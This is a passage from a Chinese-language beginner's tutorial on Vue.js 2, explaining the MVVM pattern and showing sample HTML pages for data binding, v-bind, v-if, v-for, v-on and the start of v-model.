<p> ViewModel是由前端开发人员组织生成和维护的视图数据层。在这一层， 前端开发者对从后端获取的Model数据进行转换处理， 做二次封装，以生成符合View层使用预期的视图数据模型。<br>  <br>   需要注意的是View Model所封装出来的数据模型包括视图的状态和行为两部分，而Model层的数据模型是只包含状态的</p>
<ul>
<li><p>比如页面的这一块展示什么，那一块展示什么这些都属于视图状态(展示)</p>
</li>
<li><p>页面加载进来时发生什么，点击这一块发生什么，这一块滚动时发生什么这些都属于视图行为(交互)</p>
</li>
</ul>
</li>
</ol>
<p>视图状态和行为都封装在了View Model里。这样的封装使得View Model可以完整地去描述View层。由于实现了双向绑定， View Model的内容会实时展现在View层， 这是激动人心的， 因为前端开发者再也不必低效又麻烦地通过操纵DOM去更新视图。</p>
<p>MVVM框架已经把最脏最累的一块做好了， 我们开发者只需要处理和维护View Model， 更新数据视图就会自动得到相应更新，真正实现<code>事件驱动编程</code>。</p>
<p>View层展现的不是<code>Model</code>层的数据， 而是<code>ViewModel</code>的数据， 由<code>ViewModel</code>负责与<code>Model</code>层交互， 这就完全解耦了<code>View</code>层和<code>Model</code>层， 这个解耦是至关重要的， 它是前后端分离方案实施的重要一环。</p>
<h3 id="Vue-1"><a href="#Vue-1" class="headerlink" title="Vue"></a>Vue</h3><p>Vue(读音/vju/， 类似于view) 是一套用于构建用户界面的渐进式框架， 发布于2014年2月。与其它大型框架不同的是， Vue被设计为可以自底向上逐层应用。Vue的核心库只关注视图层， 不仅易于上手， 还便于与第三方库(如：vue-router，vue-resource，vue x) 或既有项目整合。</p>
<ol>
<li><p>MVVM模式的实现者</p>
<ul>
<li><p>-Model：模型层， 在这里表示JavaScript对象</p>
</li>
<li><p>View：视图层， 在这里表示DOM(HTML操作的元素)</p>
</li>
<li><p>ViewModel：连接视图和数据的中间件， Vue.js就是MVVM中的View Model层的实现者</p>
</li>
</ul>
<p>在MVVM架构中， 是不允许数据和视图直接通信的， 只能通过ViewModel来通信， 而View Model就是定义了一个Observer观察者</p>
<ul>
<li><p>ViewModel能够观察到数据的变化， 并对视图对应的内容进行更新</p>
</li>
<li><p>ViewModel能够监听到视图的变化， 并能够通知数据发生改变</p>
<p>至此， 我们就明白了， Vue.js就是一个MV VM的实现者， 他的核心就是实现了DOM监听与数据绑定</p>
</li>
</ul>
</li>
<li><p>为什么要使用Vue.js</p>
<ul>
<li><p>轻量级， 体积小是一个重要指标。Vue.js压缩后有只有20多kb(Angular压缩后56kb+，React压缩后44kb+)</p>
</li>
<li><p>移动优先。更适合移动端， 比如移动端的Touch事件</p>
</li>
<li><p>易上手，学习曲线平稳，文档齐全</p>
</li>
<li><p>吸取了Angular(模块化) 和React(虚拟DOＭ)的长处， 并拥有自己独特的功能，如：计算属性</p>
</li>
<li><p>开源，社区活跃度高</p>
</li>
</ul>
</li>
</ol>
<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p><strong>（1）下载地址</strong></p>
<ul>
<li>开发版本<ul>
<li>包含完整的警告和调试模式：https：<a href="https://yuejs.org/js/vue.js" target="_blank" rel="noopener">//yuejs.org/js/vue.js</a></li>
<li>删除了警告， 30.96KB min+gzip：https：<a href="https://vuejs.org/js/vue.min.js" target="_blank" rel="noopener">//vuejs.org/js/vue.min.js</a></li>
</ul>
</li>
<li>CDN<ul>
<li><code>&lt;script src=“https://cdn.jsdelivr.net/npm/vue@2.5.21/dist/vue.js”&gt;&lt;/script&gt;</code></li>
<li><code>&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2.5.21/dist/vue.min.js&quot;&gt;&lt;/script&gt;</code></li>
</ul>
</li>
</ul>
<p><strong>（2）代码编写</strong></p>
<p>Vue.js的核心是实现了MVVM模式， 她扮演的角色就是View Model层， 那么所谓的第一个应用程序就是展示她的数据绑定功能，操作流程如下：<br>  <strong>1、创建一个HTML文件</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>2、引入Vue.js</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--1.导入Vue.js--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.21/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">12</span><br><span class="line">123</span><br></pre></td></tr></table></figure>
<p><strong>3、创建一个Vue实例</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#app"</span>,</span></span><br><span class="line"><span class="actionscript">        <span class="comment">/*Model：数据*/</span></span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            message:<span class="string">"hello,vue!"</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li><code>el: &#39;#vue&#39;</code>：绑定元素的ID</li>
<li><code>data:{message:&#39;Hello Vue!&#39;}</code>：数据对象中有一个名为message的属性，并设置了初始值 Hello Vue！</li>
</ul>
<p>4、将数据绑定到页面元素</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--view层，模板--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    &#123;&#123;message&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>说明：只需要在绑定的元素中使用双花括号将Vue创建的名为message属性包裹起来， 即可实现数据绑定功能， 也就实现了View Model层所需的效果， 是不是和EL表达式非常像?</p>
<p><strong>（3）完整的HTML</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--view层，模板--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    &#123;&#123;message&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--1.导入Vue.js--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.21/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#app"</span>,</span></span><br><span class="line"><span class="actionscript">        <span class="comment">/*Model：数据*/</span></span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            message:<span class="string">"hello,vue!"</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>（4）测试</strong></p>
<p>为了能够更直观的体验Vue带来的数据绑定功能， 我们需要在浏览器测试一番， 操作流程如下：</p>
<p>  1. 在浏览器上运行第一个Vue应用程序， 进入开发者工具</p>
<p>  2. 在控制台输入vm.message=‘HelloWorld’， 然后回车， 你会发现浏览器中显示的内容会直接变成HelloWorld</p>
<p>  此时就可以在控制台直接输入vm.message来修改值， 中间是可以省略data的， 在这个操作中， 我并没有主动操作DOM， 就让页面的内容发生了变化， 这就是借助了Vue的数据绑定功能实现的； MV VM模式中要求View Model层就是使用观察者模式来实现数据的监听与绑定， 以做到数据与视图的快速响应。</p>
<h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="v-bind"><a href="#v-bind" class="headerlink" title="v-bind"></a>v-bind</h3><p>我们已经成功创建了第一个Vue应用!看起来这跟渲染一个字符串模板非常类似， 但是Vue在背后做了大量工作。现在数据和DOM已经被建立了关联， 所有东西都是响应式的。我们在控制台操作对象属性，界面可以实时更新!</p>
<p>我们还可以使用v-bind来绑定元素特性!</p>
<p>  <strong>上代码</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">xmlns:v-bind</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--view层，模板--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-bind:title</span>=<span class="string">"message"</span>&gt;</span></span><br><span class="line">    鼠标悬停几秒钟查看此处动态绑定的提示信息！</span><br><span class="line">  <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--1.导入Vue.js--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.21/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#app"</span>,</span></span><br><span class="line"><span class="actionscript">        <span class="comment">/*Model：数据*/</span></span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            message: <span class="string">'页面加载于 '</span> + <span class="keyword">new</span> <span class="built_in">Date</span>().toLocaleString()</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/Vue/第一个Vue程序.png" alt="avatar"></p>
<p>你看到的v-bind等被称为指令。指令带有前缀v以表示它们是Vue提供的特殊特性。可能你已经猜到了， 它们会在渲染的DOM上应用特殊的响应式行为在这里，该指令的意思是：“将这个元素节点的title特性和Vue实例的message属性保持一致”。</p>
<p>如果你再次打开浏览器的JavaScript控制台， 输入app， message=‘新消息’，就会再一次看到这个绑定了title特性的HTML已经进行了更新。</p>
<h3 id="v-if，-v-else"><a href="#v-if，-v-else" class="headerlink" title="v-if， v-else"></a>v-if， v-else</h3><p>什么是条件判断语句，就不需要我说明了吧，以下两个属性!</p>
<ul>
<li><p><code>v-if</code></p>
</li>
<li><p><code>v-else</code></p>
</li>
</ul>
<p><strong>上代码</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">xmlns:v-bind</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--view层，模板--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-if</span>=<span class="string">"ok"</span>&gt;</span>Yes<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-else</span>&gt;</span>No<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--1.导入Vue.js--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.21/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#app"</span>,</span></span><br><span class="line"><span class="actionscript">        <span class="comment">/*Model：数据*/</span></span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            type: <span class="literal">true</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>测试：</p>
<ol>
<li><p>在浏览器上运行，打开控制台!</p>
</li>
<li><p>在控制台输入<code>vm.ok=false</code>然后回车，你会发现浏览器中显示的内容会直接变成NO</p>
</li>
</ol>
<p>注：使用<code>v-*</code>属性绑定数据是不需要<code>双花括号</code>包裹的</p>
<p><strong>v-else-if</strong></p>
<ul>
<li><p>v-if</p>
</li>
<li><p>v-else-if</p>
</li>
<li><p>v-else</p>
<p>注：<code>===</code>三个等号在JS中表示绝对等于(就是数据与类型都要相等)上代码：</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">xmlns:v-bind</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--view层，模板--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-if</span>=<span class="string">"type==='A'"</span>&gt;</span>A<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-else-if</span>=<span class="string">"type==='B'"</span>&gt;</span>B<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-else-if</span>=<span class="string">"type==='D'"</span>&gt;</span>D<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-else</span>&gt;</span>C<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--1.导入Vue.js--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.21/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#app"</span>,</span></span><br><span class="line"><span class="actionscript">        <span class="comment">/*Model：数据*/</span></span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            type: <span class="string">'A'</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h3><ul>
<li>v-for</li>
</ul>
<p>格式说明</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"(item,index) in items"</span>&gt;</span></span><br><span class="line">        &#123;&#123;item.message&#125;&#125;---&#123;&#123;index&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>注：<code>items</code>是数组，<code>item</code>是数组元素迭代的别名。我们之后学习的Thymeleaf模板引擎的语法和这个十分的相似！</p>
<p>  上代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--view层，模板--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"(item,index) in items"</span>&gt;</span></span><br><span class="line">        &#123;&#123;item.message&#125;&#125;---&#123;&#123;index&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--1.导入Vue.js--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.21/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#app"</span>,</span></span><br><span class="line"><span class="actionscript">        <span class="comment">/*Model：数据*/</span></span></span><br><span class="line">        data:&#123;</span><br><span class="line">            items:[</span><br><span class="line"><span class="actionscript">                &#123;message:<span class="string">'狂神说Java'</span>&#125;,</span></span><br><span class="line"><span class="actionscript">                &#123;message:<span class="string">'狂神说前端'</span>&#125;,</span></span><br><span class="line"><span class="actionscript">                &#123;message:<span class="string">'狂神说运维'</span>&#125;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>测试：在控制台输入<code>vm.items.push({message：&#39;狂神说运维&#39;})</code>，尝试追加一条数据，你会发现浏览器中显示的内容会增加一条<code>狂神说运维</code>.</p>
<h2 id="v-on监听事件"><a href="#v-on监听事件" class="headerlink" title="v-on监听事件"></a>v-on监听事件</h2><p><code>v-on</code>监听事件<br> emsp;事件有Vue的事件、和前端页面本身的一些事件!我们这里的<code>click</code>是vue的事件， 可以绑定到Vue中的<code>methods</code>中的方法事件!</p>
<p>  <strong>上代码</strong>：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    1.导入vue--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--view层 模板--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">"sayHi"</span>&gt;</span>click Me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#app"</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            message:<span class="string">"51nd0re1"</span></span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="actionscript">        methods:&#123;<span class="comment">//方法定义在Vue的Method对象中  v-on:事件</span></span></span><br><span class="line"><span class="actionscript">            sayHi:<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                alert(<span class="keyword">this</span>.message);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>点击测试</strong></p>
<p>  Vue还有一些基本的使用方式， 大家有需要的可以再跟着官方文档看看， 因为这些基本的指令几乎我们都见过了，一通百通!掌握学习的方式!</p>
<h2 id="v-model双向绑定"><a href="#v-model双向绑定" class="headerlink" title="v-model双向绑定"></a>v-model双向绑定</h2><h3 id="什么是双向数据绑定"><a href="#什么是双向数据绑定" class="headerlink" title="什么是双向数据绑定"></a>什么是双向数据绑定</h3><p>Vue.js是一个MV VM框架， 即数据双向绑定， 即当数据发生变化的时候， 视图也就发生变化， 当视图发生变化的时候，数据也会跟着同步变化。这也算是Vue.js的精髓之处了。</p>
<p>值得注意的是，我们所说的数据双向绑定，一定是对于UI控件来说的非UI控件不会涉及到数据双向绑定。单向数据绑定是使用状态管理工具的前提。如果我们使用vue x那么数据流也是单项的，这时就会和双向数据绑定有冲突。</p>
<h3 id="为什么要实现数据的双向绑定"><a href="#为什么要实现数据的双向绑定" class="headerlink" title="为什么要实现数据的双向绑定"></a>为什么要实现数据的双向绑定</h3><p>在<code>Vue.js</code>中，如果使用<code>vuex</code>， 实际上数据还是单向的， 之所以说是数据双向绑定，这是用的UI控件来说， 对于我们处理表单， <code>Vue.js</code>的双向数据绑定用起来就特别舒服了。即两者并不互斥，在全局性数据流使用单项，方便跟踪；局部性数据流使用双向，简单易操作。</p>
<h3 id="在表单中使用双向数据绑定"><a href="#在表单中使用双向数据绑定" class="headerlink" title="在表单中使用双向数据绑定"></a>在表单中使用双向数据绑定</h3><p>你可以用<code>v-model</code>指令在表单、及元素上创建双向数据绑定。它会根据控件类型自动选取正确的方法来更新元素。尽管有些神奇， 但<code>v-model</code>本质上不过是语法糖。它负责监听用户的输入事件以更新数据，并对一些极端场景进行一些特殊处理。</p>
<p>注意：<code>v-model</code>会忽略所有表单元素的<code>value</code>、<code>checked</code>、<code>selected</code>特性的初始值而总是将<code>Vue</code>实例的数据作为数据来源。你应该通过<code>JavaScript</code>在组件的<code>data</code>选项中声明初始值!</p>
<h4 id="单行文本"><a href="#单行文本" class="headerlink" title="单行文本"></a>单行文本</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.min.js"</span>&gt;</span><span 